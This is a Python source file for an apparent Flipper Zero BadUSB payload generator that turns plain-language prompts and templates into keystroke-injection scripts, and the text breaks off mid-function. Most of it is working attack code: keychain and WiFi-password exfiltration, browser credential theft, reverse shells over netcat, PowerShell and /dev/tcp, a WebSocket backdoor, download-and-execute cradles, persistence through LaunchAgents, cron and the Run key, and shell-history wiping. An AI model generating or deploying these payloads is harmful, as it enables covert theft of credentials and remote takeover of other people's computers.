#!/usr/bin/env python3
"""
ERR0RS — Flipper Zero & BadUSB Knowledge Engine v2.0
Indexes ALL community repos: Jakoby, UberGuidoZ, narstybits, ClaraCrazy/Momentum, EvilPortal
Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import re
import json
import shutil
import subprocess
from pathlib import Path
from typing import Optional, List, Dict

ROOT_DIR  = Path(__file__).resolve().parents[2]
KB_DIR    = ROOT_DIR / "knowledge" / "badusb"
OUT_DIR   = ROOT_DIR / "output"  / "flipper_sd"

# ── Repo registry ─────────────────────────────────────────────────────────────
REPOS = {
    "MacOS-DuckyScripts": {
        "path":   KB_DIR / "MacOS-DuckyScripts",
        "author": "narstybits",
        "type":   "badusb",
        "exts":   [".txt"],
        "tags":   ["macos","ducky","flipper"],
    },
    "Flipper-Zero-BadUSB": {
        "path":   KB_DIR / "Flipper-Zero-BadUSB",
        "author": "I-Am-Jakoby",
        "type":   "badusb",
        "exts":   [".txt", ".ps1"],
        "tags":   ["flipper","badusb","powershell","windows","jakoby"],
    },
    "PowerShell-for-Hackers": {
        "path":   KB_DIR / "PowerShell-for-Hackers",
        "author": "I-Am-Jakoby",
        "type":   "powershell",
        "exts":   [".md", ".ps1"],
        "tags":   ["powershell","windows","hacking","functions","jakoby"],
    },
    "UberGuidoZ-Flipper": {
        "path":   KB_DIR / "UberGuidoZ-Flipper",
        "author": "UberGuidoZ",
        "type":   "multi",
        "exts":   [".txt", ".ir", ".sub", ".nfc", ".rfid"],
        "tags":   ["flipper","badusb","subghz","nfc","ir","rfid","uber"],
    },
    "flipper-zero-evil-portal": {
        "path":   KB_DIR / "flipper-zero-evil-portal",
        "author": "bigbrodude6119",
        "type":   "evil_portal",
        "exts":   [".html", ".txt"],
        "tags":   ["evil portal","wifi","captive portal","esp32","flipper"],
    },
}

# ── PowerShell function library from Jakoby ──────────────────────────────────
JAKOBY_PS_FUNCTIONS = {
    "Get-BrowserData":       "Steal browser cookies, history, saved passwords",
    "Get-GeoLocation":       "Get target GPS coordinates via IP geolocation",
    "Wifi-Info":             "Dump all saved WiFi passwords from Windows",
    "Discord-Upload":        "Exfil files via Discord webhook",
    "DropBox-Upload":        "Exfil files via Dropbox API",
    "UAC-Bypass":            "Bypass Windows UAC for privilege escalation",
    "If-Admin":              "Check if running as administrator",
    "Hide-Msg":              "Display hidden popup messages",
    "MsgBox":                "Create custom Windows message boxes",
    "Detect-Mouse-Movement": "Detect if user is at keyboard (anti-sandbox)",
    "Set-WallPaper":         "Change desktop wallpaper remotely",
    "Set-Volume":            "Set/mute system volume",
    "Speak":                 "Text-to-speech output",
    "PlaySound":             "Play audio file from URL",
    "B64":                   "Base64 encode/decode payloads",
    "Clean-Exfil":           "Remove exfil artifacts/cleanup tracks",
    "Minimize-Apps":         "Minimize all windows (stealth)",
    "Abuse-CapsLock":        "Use CapsLock LED as covert signaling",
    "honeypot":              "Detect if running in honeypot/VM",
    "ns-lookup":             "DNS lookup and network recon",
    "DefaultBrowser":        "Get/set default browser",
    "Invoke-WebRequest":     "Download and execute remote payloads",
}

# ── Jakoby BadUSB payload catalog ────────────────────────────────────────────
JAKOBY_PAYLOADS = {
    "Flip-Credz-Plz":    "Credential harvester — captures Windows credentials",
    "Flip-BrowserData":  "Browser data stealer — cookies, passwords, history",
    "Flip-WifiGrabber":  "WiFi password dumper — all saved networks",
    "Flip-Keylogger":    "Keystroke logger with exfil",
    "Flip-IP-Grabber":   "Public IP + geolocation exfil",
    "Flip-EvilGoose":    "Social engineering payload with distractions",
    "Flip-AcidBurn":     "Destructive payload (educational)",
    "Flip-PineApple":    "WiFi Pineapple integration payload",
    "Flip-ADV-Recon":    "Advanced system recon + exfil",
    "Flip-ShortcutJacker": "Hijack Windows shortcuts for persistence",
    "Flip-MustSub":      "Social engineering / YouTube sub payload",
    "Flip-Play-WAV":     "Audio playback payload",
    "Flip-PS-Draw":      "PowerShell ASCII art dropper",
    "Flip-WallPaper-URL":"Wallpaper changer from URL",
    "Flip-We-Found-You": "Scare/social engineering payload",
    "Flip-YT-Tripwire":  "YouTube tripwire notification payload",
    "VoiceLogger":       "Microphone recording payload",
}

# ── UberGuidoZ categories ─────────────────────────────────────────────────────
UBER_CATEGORIES = {
    "BadUSB":    "USB keystroke injection scripts — Windows, macOS, Linux",
    "Sub-GHz":   "Garage doors, remotes, doorbells, RF signals",
    "NFC":       "Amiibo, HID iClass, NFC card data",
    "Infrared":  "TV remotes, AC units, fans, projectors — IR signals",
    "RFID":      "RFID card data, H10301 brute force",
    "Graphics":  "Flipper animations and custom graphics",
    "Music_Player": "RTTTL tones, theme songs",
    "GPIO":      "ESP8266 WiFi wiring schematics",
    "Applications": "Custom FAP apps for Flipper",
    "Dolphin_Level": "XP level state files",
    "Firmware_Options": "Firmware comparison guide",
}

# ── Script templates (all platforms) ─────────────────────────────────────────
SCRIPT_TEMPLATES = {

    # ── macOS ──────────────────────────────────────────────────────────────
    "keychain_exfil": {
        "description": "Exfiltrate macOS login keychain via email",
        "category": "Execution", "platform": "macos",
        "author": "ERR0RS / 47LeCoste",
        "tags": ["macos","keychain","credentials","email"],
        "template": (
            "REM ERR0RS — macOS Keychain Exfil | EDUCATIONAL ONLY\n"
            "ID 05ac:021e Apple:Keyboard\n"
            "DELAY 5000\nGUI SPACE\nDELAY 500\nSTRING terminal\nDELAY 500\nENTER\nDELAY 1000\n"
            "STRING unset HISTFILE\nENTER\nDELAY 500\n"
            "STRING cd ~/Library/Keychains/\nENTER\nDELAY 500\n"
            "STRING zip login.zip login.keychain &\nENTER\nDELAY 5000\n"
            "STRING mail -s \"Keychain\" {EMAIL} < login.zip && rm login.zip &\n"
            "ENTER\nDELAY 5000\nSTRING exit\nENTER"
        ),
        "variables": {"EMAIL": "recipient@example.com"},
    },

    "reverse_shell_nc": {
        "description": "Netcat reverse shell on macOS",
        "category": "RECON", "platform": "macos",
        "author": "ERR0RS / narstybits",
        "tags": ["macos","reverse shell","netcat"],
        "template": (
            "REM ERR0RS — macOS Netcat Reverse Shell\n"
            "REM Attacker: nc {LHOST} {LPORT}\n"
            "ID 05ac:021e Apple:Keyboard\n"
            "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nDELAY 1000\nENTER\nDELAY 1000\n"
            "STRING unset HISTFILE\nENTER\nDELAY 500\n"
            "STRING brew install netcat 2>/dev/null; nohup nc -l -p {LPORT} -e /bin/bash > /dev/null 2>&1 &\n"
            "ENTER\nDELAY 15000\nSTRING clear\nENTER\nDELAY 500\nGUI m"
        ),
        "variables": {"LHOST": "192.168.1.100", "LPORT": "4444"},
    },

    "websocket_shell": {
        "description": "Python WebSocket backdoor — stealth persistence",
        "category": "Execution", "platform": "macos",
        "author": "ERR0RS / narstybits",
        "tags": ["macos","websocket","python","backdoor"],
        "template": (
            "REM ERR0RS — macOS WebSocket Shell\n"
            "REM Connect: websocat ws://{TARGET_IP}:{PORT}\n"
            "ID 05ac:021e Apple:Keyboard\n"
            "DELAY 500\nGUI SPACE\nDELAY 500\nSTRING terminal\nDELAY 500\nENTER\nDELAY 1000\n"
            "STRING unset HISTFILE\nENTER\nDELAY 500\n"
            "STRING mkdir -p ~/.phantom_ws && cd ~/.phantom_ws\nENTER\nDELAY 500\n"
            "STRING pip3 install websockets -q 2>/dev/null\nENTER\nDELAY 8000\n"
            "STRING nohup python3 -c \"import asyncio,websockets,subprocess\n"
            "async def h(ws,p):\n async for m in ws:\n"
            "  r=subprocess.run(m,shell=True,capture_output=True)\n"
            "  await ws.send(r.stdout.decode()+r.stderr.decode())\n"
            "asyncio.run(websockets.serve(h,'{BIND_IP}',{PORT}).serve_forever())\" > /dev/null 2>&1 &\n"
            "ENTER\nDELAY 1000\nSTRING clear\nENTER"
        ),
        "variables": {"TARGET_IP":"192.168.1.100","BIND_IP":"0.0.0.0","PORT":"8765"},
    },

    "macos_recon": {
        "description": "Full system + network recon dump on macOS",
        "category": "RECON", "platform": "macos",
        "author": "ERR0RS / narstybits",
        "tags": ["macos","recon","sysinfo","network"],
        "template": (
            "REM ERR0RS — macOS System Recon\n"
            "ID 05ac:021e Apple:Keyboard\n"
            "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nDELAY 500\nENTER\nDELAY 1000\n"
            "STRING unset HISTFILE\nENTER\nDELAY 500\n"
            "STRING (uname -a; whoami; id; ifconfig | grep inet; arp -a) > /tmp/errz_recon.txt 2>&1\n"
            "ENTER\nDELAY 3000\n"
            "STRING curl -X POST -d @/tmp/errz_recon.txt {EXFIL_URL} 2>/dev/null; rm /tmp/errz_recon.txt\n"
            "ENTER\nDELAY 2000\nSTRING clear\nENTER"
        ),
        "variables": {"EXFIL_URL": "http://192.168.1.100:8080/data"},
    },

    "macos_persistence": {
        "description": "LaunchAgent persistence — survives reboots",
        "category": "Execution", "platform": "macos",
        "author": "ERR0RS",
        "tags": ["macos","persistence","launchagent","startup"],
        "template": (
            "REM ERR0RS — macOS LaunchAgent Persistence\n"
            "ID 05ac:021e Apple:Keyboard\n"
            "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nDELAY 500\nENTER\nDELAY 1000\n"
            "STRING unset HISTFILE\nENTER\nDELAY 500\n"
            "STRING mkdir -p ~/Library/LaunchAgents\nENTER\nDELAY 300\n"
            "STRING /usr/libexec/PlistBuddy -c \"Add :Label string com.errz\" "
            "-c \"Add :ProgramArguments array\" "
            "-c \"Add :ProgramArguments:0 string /bin/bash\" "
            "-c \"Add :ProgramArguments:1 string -c\" "
            "-c \"Add :ProgramArguments:2 string '{PAYLOAD_CMD}'\" "
            "-c \"Add :RunAtLoad bool true\" "
            "-c \"Add :KeepAlive bool true\" "
            "~/Library/LaunchAgents/com.errz.plist 2>/dev/null\n"
            "ENTER\nDELAY 500\n"
            "STRING launchctl load ~/Library/LaunchAgents/com.errz.plist 2>/dev/null\n"
            "ENTER\nDELAY 500\nSTRING clear\nENTER"
        ),
        "variables": {"PAYLOAD_CMD": "nc -l -p 4444 -e /bin/bash"},
    },

    # ── Windows (Jakoby-style) ──────────────────────────────────────────────
    "win_wifi_passwords": {
        "description": "Dump all saved WiFi passwords — Windows",
        "category": "RECON", "platform": "windows",
        "author": "ERR0RS / I-Am-Jakoby",
        "tags": ["windows","wifi","passwords","powershell","jakoby"],
        "template": (
            "REM ERR0RS — Windows WiFi Password Grabber\n"
            "REM Based on Jakoby's Flip-WifiGrabber\n"
            "DELAY 1000\n"
            "GUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass\nENTER\nDELAY 1500\n"
            "STRING $w=(netsh wlan show profiles)|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()};"
            "$r=$w|%{$p=$_;$k=(netsh wlan show profile name=$p key=clear)|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()};"
            "[PSCustomObject]@{SSID=$p;Password=$k}};"
            "$r|ConvertTo-Json|Out-File $env:TEMP\\wifi.json;"
            "Invoke-WebRequest -Uri '{EXFIL_URL}' -Method POST -Body (Get-Content $env:TEMP\\wifi.json -Raw);"
            "Remove-Item $env:TEMP\\wifi.json\n"
            "ENTER\nDELAY 3000"
        ),
        "variables": {"EXFIL_URL": "http://192.168.1.100:8080/wifi"},
    },

    "win_browser_data": {
        "description": "Steal browser cookies + passwords — Windows",
        "category": "Execution", "platform": "windows",
        "author": "ERR0RS / I-Am-Jakoby",
        "tags": ["windows","browser","credentials","cookies","jakoby"],
        "template": (
            "REM ERR0RS — Windows Browser Data Stealer\n"
            "REM Based on Jakoby's Flip-BrowserData\n"
            "DELAY 1000\n"
            "GUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass\nENTER\nDELAY 1500\n"
            "STRING IEX(New-Object Net.WebClient).DownloadString('{PAYLOAD_URL}')\n"
            "ENTER\nDELAY 3000"
        ),
        "variables": {"PAYLOAD_URL": "http://192.168.1.100:8080/Get-BrowserData.ps1"},
    },

    "win_uac_bypass": {
        "description": "UAC bypass + admin shell — Windows",
        "category": "Exploitation", "platform": "windows",
        "author": "ERR0RS / I-Am-Jakoby",
        "tags": ["windows","uac","privilege escalation","admin","jakoby"],
        "template": (
            "REM ERR0RS — Windows UAC Bypass\n"
            "REM Based on Jakoby's UAC-Bypass\n"
            "DELAY 1000\n"
            "GUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass\nENTER\nDELAY 1500\n"
            "STRING $p=New-Object System.Diagnostics.ProcessStartInfo 'powershell';"
            "$p.Arguments='-w hidden -ep bypass -c {PAYLOAD_CMD}';"
            "$p.Verb='runas';[System.Diagnostics.Process]::Start($p)\n"
            "ENTER\nDELAY 2000"
        ),
        "variables": {"PAYLOAD_CMD": "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/shell.ps1')"},
    },

    "win_reverse_shell": {
        "description": "PowerShell reverse shell — Windows",
        "category": "RECON", "platform": "windows",
        "author": "ERR0RS / I-Am-Jakoby",
        "tags": ["windows","reverse shell","powershell","netcat"],
        "template": (
            "REM ERR0RS — Windows PowerShell Reverse Shell\n"
            "DELAY 1000\n"
            "GUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass -nop\nENTER\nDELAY 1500\n"
            "STRING $c=New-Object Net.Sockets.TcpClient('{LHOST}',{LPORT});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$rb=([text.encoding]::ASCII).GetBytes($r);"
            "$s.Write($rb,0,$rb.Length)}\n"
            "ENTER"
        ),
        "variables": {"LHOST": "192.168.1.100", "LPORT": "4444"},
    },

    # ── Evil Portal ────────────────────────────────────────────────────────
    "evil_portal_config": {
        "description": "Evil Portal AP config for Flipper SD",
        "category": "Evil Portal", "platform": "flipper",
        "author": "ERR0RS / bigbrodude6119",
        "tags": ["flipper","evil portal","wifi","captive portal"],
        "template": "SSID={SSID}\npassword={PASSWORD}\nchannel={CHANNEL}\nhidden=false",
        "variables": {"SSID":"FreeWifi","PASSWORD":"","CHANNEL":"6"},
        "output_path": "apps_data/evil_portal/ap.config.txt",
    },

    "stealth_open": {
        "description": "Open terminal with full history suppression",
        "category": "Obscurity", "platform": "macos",
        "author": "ERR0RS",
        "tags": ["macos","stealth","opsec","history"],
        "template": (
            "REM ERR0RS — Stealth Terminal Opener\n"
            "ID 05ac:021e Apple:Keyboard\n"
            "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nDELAY 500\nENTER\nDELAY 1000\n"
            "STRING export HISTCONTROL=ignorespace; unset HISTFILE; export HISTSIZE=0\n"
            "ENTER\nDELAY 500"
        ),
        "variables": {},
    },
}


# ═══════════════════════════════════════════════════════════════════════════
# NLP → DUCKYSCRIPT TRANSLATION ENGINE
# Converts natural language prompts to Flipper-compatible DuckyScript.
# Hailo-10H hook point: swap _nlp_translate() for NPU inference when live.
# ═══════════════════════════════════════════════════════════════════════════

# ── OS detection keywords ─────────────────────────────────────────────────
_OS_KEYWORDS = {
    "linux":   ["linux","kali","ubuntu","debian","parrot","bash","terminal","gnome"],
    "windows": ["windows","win","powershell","cmd","explorer","registry","notepad","win+r","gui r"],
    "macos":   ["mac","macos","osx","spotlight","finder","homebrew","launchpad","gui space","cmd space"],
    "android": ["android","adb","apk","dalvik","pixel","samsung","google play"],
    "ios":     ["ios","iphone","ipad","safari","siri","face id","apple id"],
}

# ── Intent → DuckyScript mapping ─────────────────────────────────────────
_NLP_RULES = [
    # ── Terminal / Shell open ─────────────────────────────────────────
    (["open terminal","open a terminal","launch terminal","start terminal",
      "get a shell","open shell","open bash","get bash"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden\nENTER"),

    (["open terminal","open a terminal","launch terminal","start terminal",
      "get a shell","open bash"],
     "linux",   "CTRL ALT t"),

    (["open terminal","open a terminal","launch terminal","start terminal",
      "get a shell"],
     "macos",   "GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER"),

    # ── Run / execute a command ───────────────────────────────────────
    (["run", "execute", "type", "enter"],
     "windows", "GUI r\nDELAY 600\nSTRING {CMD}\nENTER"),

    (["run", "execute", "type"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING {CMD}\nENTER"),

    (["run", "execute", "type"],
     "macos",   "GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING {CMD}\nENTER"),

    # ── Reverse shell ─────────────────────────────────────────────────
    (["reverse shell","rev shell","revshell","connect back","get shell back"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1 &\nENTER"),

    (["reverse shell","rev shell","revshell","get shell back"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden -ep bypass -c \"$c=New-Object Net.Sockets.TcpClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}\"\nENTER"),

    (["reverse shell","rev shell","revshell"],
     "macos",   "GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1 &\nENTER"),

    # ── Network diagnostics ───────────────────────────────────────────
    (["ping test","ping check","test network","check network","network test"],
     "windows", "GUI r\nDELAY 600\nSTRING cmd /c ping 8.8.8.8 -n 4\nENTER"),

    (["ping test","ping check","test network","check network"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING ping -c 4 8.8.8.8\nENTER"),

    (["ping test","ping check","test network","check network"],
     "macos",   "GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING ping -c 4 8.8.8.8\nENTER"),

    # ── WiFi passwords ────────────────────────────────────────────────
    (["wifi password","wifi passwords","wifi cred","wifi credentials","saved wifi"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden -ep bypass -c \"(netsh wlan show profiles) | Select-String 'All User Profile' | % {($_ -split ':')[1].Trim()} | % {netsh wlan show profile name=$_ key=clear} | Select-String 'Key Content'\"\nENTER"),

    (["wifi password","wifi passwords","wifi cred","saved wifi"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING grep -r 'psk=' /etc/NetworkManager/system-connections/ 2>/dev/null\nENTER"),

    # ── System info / recon ───────────────────────────────────────────
    (["system info","sysinfo","who am i","whoami","system information","recon"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden -ep bypass -c \"whoami; hostname; ipconfig; systeminfo | Select-String 'OS'\"\nENTER"),

    (["system info","sysinfo","whoami","recon","system information"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING uname -a && whoami && id && ip addr && cat /etc/os-release\nENTER"),

    (["system info","sysinfo","whoami","recon"],
     "macos",   "GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING uname -a && whoami && id && ifconfig\nENTER"),

    # ── Lock screen ───────────────────────────────────────────────────
    (["lock screen","lock the screen","lock workstation","lock computer"],
     "windows", "GUI l"),

    (["lock screen","lock the screen","lock computer"],
     "macos",   "CTRL GUI q"),

    (["lock screen","lock the screen"],
     "linux",   "CTRL ALT l"),

    # ── Screenshot ────────────────────────────────────────────────────
    (["take screenshot","screenshot","capture screen","screen capture"],
     "windows", "PRINTSCREEN\nDELAY 500"),

    (["take screenshot","screenshot"],
     "macos",   "GUI SHIFT 3"),

    (["take screenshot","screenshot"],
     "linux",   "PRINTSCREEN"),

    # ── Persistence ───────────────────────────────────────────────────
    (["persist","persistence","startup","run on boot","run at boot","survive reboot"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden -ep bypass -c \"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d '{PAYLOAD}' /f\"\nENTER"),

    (["persist","persistence","startup","run on boot","cron","crontab"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING (crontab -l 2>/dev/null; echo '@reboot {PAYLOAD}') | crontab -\nENTER"),

    # ── Exfil ─────────────────────────────────────────────────────────
    (["exfil","exfiltrate","send data","upload data","steal data","data exfil"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden -ep bypass -c \"Invoke-WebRequest -Uri '{EXFIL_URL}' -Method POST -Body (Get-Content {FILE_PATH} -Raw)\"\nENTER"),

    (["exfil","exfiltrate","send data","steal data"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING curl -X POST {EXFIL_URL} -d @{FILE_PATH}\nENTER"),

    # ── Download and execute ──────────────────────────────────────────
    (["download","download and run","download and execute","fetch and run","iex","cradle"],
     "windows", "GUI r\nDELAY 600\nSTRING powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{PAYLOAD_URL}')\"\nENTER"),

    (["download","download and run","download and execute","fetch and run"],
     "linux",   "CTRL ALT t\nDELAY 1200\nSTRING curl -s {PAYLOAD_URL} | bash\nENTER"),
]



def _detect_os(prompt: str, target_os: str = "auto") -> str:
    """
    Detect target OS from prompt keywords or explicit argument.
    Returns: 'linux' | 'windows' | 'macos' | 'android' | 'ios'
    """
    if target_os and target_os != "auto":
        return target_os.lower()
    lower = prompt.lower()
    for os_name, keywords in _OS_KEYWORDS.items():
        if any(kw in lower for kw in keywords):
            return os_name
    return "linux"   # safe default for Kali/Parrot environments


def _extract_command(prompt: str) -> str:
    """Extract the actual command string after 'run', 'type', 'execute' etc."""
    lower = prompt.lower()
    for marker in ["run ", "execute ", "type ", "enter ", "and run ", "then run "]:
        idx = lower.find(marker)
        if idx != -1:
            remainder = prompt[idx + len(marker):].strip()
            if remainder:
                return remainder
    return prompt.strip()


def _nlp_translate(prompt: str, target_os: str = "auto") -> str:
    """
    Core NLP → DuckyScript translator.

    Checks rules in _NLP_RULES for intent + OS match.
    Falls back to a generic STRING injection if no rule matches.

    Hailo-10H integration point: replace this function body with
    an NPU inference call when the Pi 5 AI HAT+ is live.
    The function signature must stay identical.

    Args:
        prompt:    Natural language description (e.g. "open terminal and run ping test")
        target_os: 'linux' | 'windows' | 'macos' | 'android' | 'ios' | 'auto'

    Returns:
        DuckyScript string ready for Flipper Zero
    """
    os_detected = _detect_os(prompt, target_os)
    lower        = prompt.lower()

    # Score each rule: intent match + OS match
    best_score   = 0
    best_script  = None

    for intents, rule_os, script_template in _NLP_RULES:
        if rule_os != os_detected:
            continue
        for intent in intents:
            if intent in lower:
                score = len(intent)   # longer match = more specific
                if score > best_score:
                    best_score  = score
                    best_script = script_template
                    break

    # ── Compound rule: "open terminal AND run X" ─────────────────────────
    # When prompt contains both a terminal-open intent AND a run/execute intent,
    # build a composite: open terminal → wait → type command.
    # This fires before the single-rule scorer so compound phrases win.
    open_intents = ["open terminal","launch terminal","start terminal","get a shell","get shell"]
    run_intents  = ["run ","execute ","and run","then run","type ","ping ","and ping"]
    has_open = any(oi in lower for oi in open_intents)
    has_run  = any(ri in lower for ri in run_intents)

    if has_open and has_run:
        extracted_cmd = _extract_command(prompt)
        if os_detected == "linux":
            return f"CTRL ALT t\nDELAY 1200\nSTRING {extracted_cmd}\nENTER"
        elif os_detected == "macos":
            return f"GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING {extracted_cmd}\nENTER"
        elif os_detected == "windows":
            return f"GUI r\nDELAY 600\nSTRING powershell -w hidden -c \"{extracted_cmd}\"\nENTER"

    if best_script:
        # Fill in placeholder variables from prompt context
        extracted_cmd = _extract_command(prompt)
        best_script = (
            best_script
            .replace("{CMD}",        extracted_cmd)
            .replace("{LHOST}",      "192.168.1.100")
            .replace("{LPORT}",      "4444")
            .replace("{EXFIL_URL}",  "http://192.168.1.100:8080/data")
            .replace("{FILE_PATH}",  "/tmp/loot.txt")
            .replace("{PAYLOAD}",    "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")
            .replace("{PAYLOAD_URL}","http://192.168.1.100:8080/payload.sh")
        )
        return best_script

    # Fallback: direct STRING injection — types the extracted command.
    # Mirrors the stub's basic behaviour as a safe default:
    #   "terminal" in prompt → open terminal then inject command
    extracted = _extract_command(prompt)
    if os_detected == "windows":
        return f"GUI r\nDELAY 600\nSTRING {extracted}\nENTER"
    elif os_detected == "macos":
        return f"GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING {extracted}\nENTER"
    else:
        # linux default — stub used "GUI t" as the terminal shortcut
        return f"GUI t\nDELAY 500\nSTRING {extracted}\nENTER"



# ═══════════════════════════════════════════════════════════════════════════
# FLIPPER SCRIPT ENGINE
# Main class. Combines KB search, template filling, and NLP translation.
# ═══════════════════════════════════════════════════════════════════════════

class FlipperScriptEngine:
    """
    ERR0RS BadUSB / Flipper Zero script generation engine.

    Primary interface:
        engine = FlipperScriptEngine()
        result = engine.generate("open terminal and run a ping test", target_os="linux")

    Result dict always contains:
        status:      'generated' | 'kb_match' | 'template_match' | 'error'
        script:      DuckyScript string (ready for Flipper SD)
        description: Human-readable description of what the script does
        sd_filename: Suggested SD card filename (ERRZ_<slug>.txt)
        template:    Template key used (if from SCRIPT_TEMPLATES)
        category:    Script category
        platform:    Target platform string
    """

    def __init__(self):
        self._indexed = {}
        self._index_kb()

    # ── KB file indexer ───────────────────────────────────────────────────

    def _index_kb(self):
        """Walk all knowledge/badusb repos and index .txt + .ps1 files."""
        for repo_name, meta in REPOS.items():
            path = meta["path"]
            if not path.exists():
                continue
            files = []
            for ext in meta.get("exts", [".txt"]):
                files.extend(path.rglob(f"*{ext}"))
            self._indexed[repo_name] = {
                "meta":  meta,
                "files": [str(f) for f in files[:300]],
            }

    # ── KB search ─────────────────────────────────────────────────────────

    def search_kb(self, query: str, limit: int = 8) -> list:
        """
        Search all indexed KB repos for scripts matching the query.
        Returns list of {repo, path, preview, score} dicts.
        """
        q       = query.lower()
        results = []
        for repo_name, data in self._indexed.items():
            meta  = data["meta"]
            blob  = " ".join([
                " ".join(meta.get("tags", [])),
                str(meta.get("type", "")),
            ]).lower()
            for filepath in data["files"]:
                fname = Path(filepath).stem.lower()
                score = 0
                for word in q.split():
                    if word in fname:  score += 3
                    if word in blob:   score += 1
                if score > 0:
                    try:
                        preview = Path(filepath).read_text(
                            encoding="utf-8", errors="ignore"
                        )[:200]
                    except Exception:
                        preview = ""
                    results.append({
                        "repo":    repo_name,
                        "path":    filepath,
                        "preview": preview,
                        "score":   score,
                    })
        results.sort(key=lambda x: x["score"], reverse=True)
        return results[:limit]

    # ── Template generator ────────────────────────────────────────────────

    def from_template(self, template_key: str, variables: dict = None) -> dict:
        """
        Generate a script from SCRIPT_TEMPLATES by key.
        Fills in {VARIABLE} placeholders with provided values.
        """
        tmpl = SCRIPT_TEMPLATES.get(template_key)
        if not tmpl:
            return {"status": "error", "error": f"Template '{template_key}' not found"}

        filled = tmpl["template"]
        merged = {**tmpl.get("variables", {}), **(variables or {})}
        for k, v in merged.items():
            filled = filled.replace(f"{{{k}}}", str(v))

        slug     = template_key.replace("_", "-")
        platform = tmpl.get("platform", "cross")

        return {
            "status":      "template_match",
            "script":      filled,
            "description": tmpl["description"],
            "category":    tmpl.get("category", "utility"),
            "platform":    platform,
            "author":      tmpl.get("author", "ERR0RS"),
            "template":    template_key,
            "sd_filename": f"ERRZ_{slug}.txt",
            "variables":   merged,
        }

    # ── NLP generator (primary public method) ─────────────────────────────

    def generate(self, prompt: str, target_os: str = "auto",
                 variables: dict = None) -> dict:
        """
        Generate a Flipper Zero DuckyScript from a natural language prompt.

        Priority:
          1. Check SCRIPT_TEMPLATES for a keyword match (exact intent)
          2. NLP translation via _nlp_translate() (intent + OS mapping)
          3. Fallback: STRING injection of the extracted command

        Args:
            prompt:    Natural language (e.g. "open terminal and run a ping test")
            target_os: Override OS detection ('linux'|'windows'|'macos'|'auto')
            variables: Dict of {PLACEHOLDER: value} overrides for templates

        Returns:
            Full result dict with script, status, description, sd_filename
        """
        lower    = prompt.lower()
        os_used  = _detect_os(prompt, target_os)

        # ── 1. Template keyword match ─────────────────────────────────
        template_hits = {
            "keychain":          "keychain_exfil",
            "keychain exfil":    "keychain_exfil",
            "reverse shell nc":  "reverse_shell_nc",
            "netcat shell":      "reverse_shell_nc",
            "websocket":         "websocket_shell",
            "websocket shell":   "websocket_shell",
            "macos recon":       "macos_recon",
            "system recon":      "macos_recon",
            "launchagent":       "macos_persistence",
            "macos persistence": "macos_persistence",
            "wifi password":     "win_wifi_passwords",
            "wifi passwords":    "win_wifi_passwords",
            "browser data":      "win_browser_data",
            "browser stealer":   "win_browser_data",
            "uac bypass":        "win_uac_bypass",
            "uac":               "win_uac_bypass",
            "powershell shell":  "win_reverse_shell",
            "evil portal":       "evil_portal_config",
            "stealth open":      "stealth_open",
            "stealth terminal":  "stealth_open",
        }
        for keyword, tmpl_key in template_hits.items():
            if keyword in lower:
                result = self.from_template(tmpl_key, variables)
                result["prompt"]   = prompt
                result["os_used"]  = os_used
                return result

        # ── 2. NLP translation ────────────────────────────────────────
        script = _nlp_translate(prompt, target_os)

        # Build a readable description from the prompt
        action_words = ["open", "run", "execute", "get", "test", "check",
                        "ping", "steal", "dump", "lock", "take", "download"]
        description  = prompt.strip()
        for aw in action_words:
            if aw in lower:
                description = prompt[:80]
                break

        slug = re.sub(r"[^a-z0-9]+", "-", lower[:30]).strip("-")

        return {
            "status":      "generated",
            "script":      script,
